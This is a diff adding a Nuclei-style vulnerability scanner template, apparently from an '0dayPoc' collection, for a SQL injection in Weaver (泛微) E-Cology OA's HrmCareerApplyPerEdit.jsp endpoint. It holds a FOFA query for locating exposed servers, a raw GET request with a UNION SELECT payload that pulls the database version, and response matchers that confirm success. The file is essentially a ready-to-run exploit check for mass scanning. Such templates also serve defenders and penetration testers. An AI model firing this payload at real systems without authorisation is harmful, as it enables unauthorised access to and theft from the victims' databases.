@@ -1,0 +1,30 @@
+id: weaver-e-cology-hrmcareerapply-sql
+
+info:
+  name: "泛微 E-Cology HrmCareerApplyPerEdit.jsp 存在 SQL 注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="泛微-OA（e-cology）"
+          泛微OA E-Cology系统HrmCareerApplyPerEdit.jsp接口存在SQL注入漏洞，允许攻击者通过构造恶意输入执行任意SQL命令。该缺陷可能导致数据库敏感信息泄露、数据完整性破坏或服务可用性中断，攻击者可利用此漏洞实现对后端数据库的未授权访问与操控。
+  tags: 泛微
+
+http:
+- raw:
+  - |
+    GET /pweb/careerapply/HrmCareerApplyPerEdit.jsp?id=1+union+select+1,2,@@version,2,5,6,7 HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Connection: close
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'SQL'
+  - type: word
+    part: body
+    words:
+    - 'Server'
